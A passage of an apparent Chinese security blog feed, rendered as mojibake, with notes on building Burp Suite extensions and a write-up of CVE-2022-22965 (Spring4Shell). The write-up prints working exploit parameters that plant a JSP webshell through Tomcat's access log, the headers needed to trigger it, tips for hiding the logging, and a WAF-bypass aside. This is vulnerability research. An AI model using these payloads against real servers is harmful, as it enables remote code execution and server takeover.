¼å¼:</p><pre class="line-numbers language-none"><code class="language-none"># å…¬é’¥-----BEGIN PUBLIC KEY----------END PUBLIC KEY-----  # ç§é’¥-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PKCS#1ç§é’¥è½¬æ¢ä¸ºPKCS#8æ ¼å¼: <code>openssl pkcs8 -topk8 -inform PEM -in rsa_private.pem -outform pem -nocrypt -out pkcs8.pem</code></p><p>RSAæ ¹æ®PKCS#8ç§é’¥ç”Ÿæˆå…¬é’¥:  <code>openssl rsa -in pkcs8.pem -out rsa_public.pem -pubout</code></p><h2 id="0x3-æ’ä»¶æ‰“åŒ…"><a href="#0x3-æ’ä»¶æ‰“åŒ…" class="headerlink" title="0x3. æ’ä»¶æ‰“åŒ…"></a>0x3. æ’ä»¶æ‰“åŒ…</h2><p>åœ¨æ’ä»¶å¼€å‘å®Œæˆä¹‹åï¼Œå¦‚æœä¾èµ–æœ‰ç¬¬ä¸‰æ–¹çš„JaråŒ…ï¼Œéœ€è¦æŠŠç¬¬ä¸‰æ–¹çš„ä¾èµ–ä¹Ÿæ‰“åŒ…è¿›å»ï¼Œä¿®æ”¹pom.xmlæ–‡ä»¶çš„buildæ¨¡å—ï¼ŒåŠ å…¥mavençš„æ’ä»¶é…ç½®:</p><pre class="line-numbers language-none"><code class="language-none">&lt;build&gt;       &lt;plugins&gt;           &lt;plugin&gt;               &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;               &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;source&gt;8&lt;&#x2F;source&gt;                   &lt;target&gt;8&lt;&#x2F;target&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;           &lt;plugin&gt;               &lt;artifactId&gt;maven-assembly-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;archive&gt;                       &lt;manifest&gt;                           &lt;mainClass&gt;burp.BurpExtender&lt;&#x2F;mainClass&gt;                       &lt;&#x2F;manifest&gt;                   &lt;&#x2F;archive&gt;                   &lt;descriptorRefs&gt;                       &lt;descriptorRef&gt;jar-with-dependencies&lt;&#x2F;descriptorRef&gt;                   &lt;&#x2F;descriptorRefs&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;       &lt;&#x2F;plugins&gt;   &lt;&#x2F;build&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰“åŒ…æ’ä»¶:</p><pre class="line-numbers language-none"><code class="language-none">mvn clean mvn clean compile assembly:single  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x4-æ’ä»¶è°ƒè¯•"><a href="#0x4-æ’ä»¶è°ƒè¯•" class="headerlink" title="0x4. æ’ä»¶è°ƒè¯•"></a>0x4. æ’ä»¶è°ƒè¯•</h2><p>åœ¨å¼€å‘æ’ä»¶çš„æ—¶å€™ï¼Œå¦‚æœéœ€è¦å¯¹æ’ä»¶å®æ—¶è°ƒè¯•ï¼Œå¯ä»¥é€‰æ‹©å…ˆåœ¨å®˜ç½‘ä¸‹è½½å®‰è£…ç¤¾åŒºç‰ˆæœ¬çš„BurpSuiteï¼Œç„¶åå¯åŠ¨Burpsuite:</p><pre class="line-numbers language-none"><code class="language-none">java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005 -jar burpsuite_community.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ–°å¢è¿œç¨‹è°ƒè¯•:<br><img src="/2022/04/11/burpsuite-ext-dev/1.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-Base64çš„å‘&quot;&gt;&lt;a href=&quot;#0x1-Base64çš„å‘&quot; class=&quot;headerlink&quot; title=&quot;0x1. Base64çš„å‘&quot;&gt;&lt;/a&gt;0x1. Base64çš„å‘&lt;/h2&gt;&lt;p&gt;åœ¨JDK8ç‰ˆæœ¬é‡Œé¢ï¼ŒJavaè‡ªå¸¦çš„&lt;code&gt;java.util.Base64&lt;/code&gt;æ˜¯æ ¹æ®RFC4648å’ŒRFC2045å®ç°çš„ï¼Œä½†æ˜¯JDK7é‡Œé¢çš„&lt;code&gt;sun.misc.BASE64Encoder&lt;/code&gt;ï¼Œæ˜¯RFC1521å®ç°çš„ã€‚&lt;br&gt;è¿™ä¼šå¯¼è‡´&lt;code&gt;java.util.Base64&lt;/code&gt;è§£ç JDK7ç‰ˆæœ¬çš„Base64å‘ç”Ÿé”™è¯¯ï¼š&lt;code&gt;Illegal base64 character&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨shiroçš„Base64è§£å†³ï¼Œå¢åŠ mavenä¾èµ–:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;groupId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;core&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;artifactId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;version&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;dependency&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PS: chybetaå¸ˆå‚…åœ¨æ¼æ´ç™¾å‡ºé‡Œé¢æå‡ºè¿‡ï¼ŒShiroåœ¨Base64è§£ç çš„æ—¶å€™ä¼šä¸¢å¼ƒéBase64å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡WAFé˜²ç«å¢™ï¼Œæ¯”å¦‚å¡«å……åƒåœ¾å­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x2-RSAå…¬ç§é’¥&quot;&gt;&lt;a href=&quot;#0x2-RSAå…¬ç§é’¥&quot; class=&quot;headerlink&quot; title=&quot;0x2. RSAå…¬ç§é’¥&quot;&gt;&lt;/a&gt;0x2. RSAå…¬ç§é’¥&lt;/h2&gt;&lt;p&gt;PythonåŠ è§£å¯†çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯PKCS#1æ ¼å¼çš„å…¬ç§é’¥ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# å…¬é’¥
-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----
  
# ç§é’¥
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½†æ˜¯åœ¨Javaé‡Œé¢éœ€è¦ä½¿ç”¨PKCS#8æ ¼å¼:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# å…¬é’¥
-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----
  
# ç§é’¥
-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-22965æ¼æ´è®°å½•</title>
    <link href="https://jkme.github.io/2022/04/06/CVE-2022-22965.html"/>
    <id>https://jkme.github.io/2022/04/06/CVE-2022-22965.html</id>
    <published>2022-04-05T16:00:00.000Z</published>
    <updated>2022-04-12T09:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´æ—¶é—´çº¿"><a href="#æ¼æ´æ—¶é—´çº¿" class="headerlink" title="æ¼æ´æ—¶é—´çº¿"></a>æ¼æ´æ—¶é—´çº¿</h2><ul><li><p>CVE-2010-1622 Springç¬¬ä¸€æ¬¡<a href="https://www.inbreak.net/archives/377">çˆ†å‘æ¼æ´</a>ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p></li><li><p>2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§</p></li><li><p>2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰</p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li><p>CVE-2010-1622/Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š</p><pre class="line-numbers language-none"><code class="language-none">headers &#x3D; &#123;&quot;suffix&quot;:&quot;%&gt;&#x2F;&#x2F;&quot;,            &quot;c1&quot;:&quot;Runtime&quot;,            &quot;c2&quot;:&quot;&lt;%&quot;,            &quot;DNT&quot;:&quot;1&quot;,            &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Javaç‰ˆæœ¬&gt;=JDK9 </li><li>Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)</li><li>æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰</li><li>æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢</li><li>åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: <code>class.module.classLoader.resources.context.parent.pipeline.first.enabled=false</code></li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“Content-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:<code>org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)</code>:<br><img src="/2022/04/06/CVE-2022-22965/3.png"><br>æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥<code>org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)</code>å¯¹è·å–åˆ°çš„<code>mpvs</code>è¿›è¡Œåˆæ­¥æ ¡éªŒï¼š<br><img src="/2022/04/06/CVE-2022-22965/4.png"></p><p>å°†mpvsç»‘å®šåˆ°beanå¯¹è±¡ä¸Š<code>setPropertyValues</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractPropertyAccessor</span>#<span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>PropertyValues</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/06/CVE-2022-22965/5.png"></p><p>ç„¶åè¿›å…¥åˆ°<code>setPropertyValue</code></p><pre class="line-numbers language-none"><code class="language-none">org.springframework.beans.AbstractNestablePropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥åˆ°: <code>getPropertyAccessorForPropertyPath</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractNestablePropertyAccessor</span>#<span class="token function">getPropertyAccessorForPropertyPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> propertyPath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæ—¶å€™<code>propertyPath</code>æ˜¯httpè¯·æ±‚é‡Œé¢æ³¨å…¥çš„å˜é‡: <code>class.module.classLoader.resources.context.parent.appBase</code>ï¼Œæ­¤æ—¶å¯¹å˜é‡è¿›è¡Œåˆ†å‰²ï¼Œè·å–ç¬¬ä¸€ä¸ªclassçš„åç§»é‡ï¼Œåˆ°æœ€åéƒ½ä¼šè¿›å…¥åˆ°<code>org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults</code>é‡Œé¢è¿›è¡ŒéªŒè¯ï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­å½“è·å–åˆ°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªClassè€Œåˆè·å–ClassLoaderå±æ€§ï¼Œåˆ™ç›´æ¥è·³è¿‡ã€‚<br><img src="/2022/04/06/CVE-2022-22965/8.png"></p><p>Strutså‡ºç°æ¼æ´çš„æ—¶å€™ï¼Œæœ‰å¸ˆå‚…å†™è¿‡<a href="https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b20/struts-tester/struts-tester.jsp">jspè·å–å¯ç”¨çš„ç¯å¢ƒå˜é‡</a>çš„è„šæœ¬ï¼Œå¯ä»¥è·å–å¯ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå˜é‡ã€‚</p><p>ä»£ç 